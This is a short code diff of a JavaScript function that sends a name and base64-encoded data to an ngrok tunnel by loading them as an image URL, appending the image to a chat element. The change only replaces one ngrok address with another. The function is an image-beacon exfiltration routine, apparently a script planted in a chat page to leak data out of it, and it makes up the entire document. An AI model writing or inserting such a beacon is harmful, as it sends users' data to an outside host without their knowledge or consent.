@@ -1,6 +1,6 @@
 function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://7b1440ce.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://1c791916.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
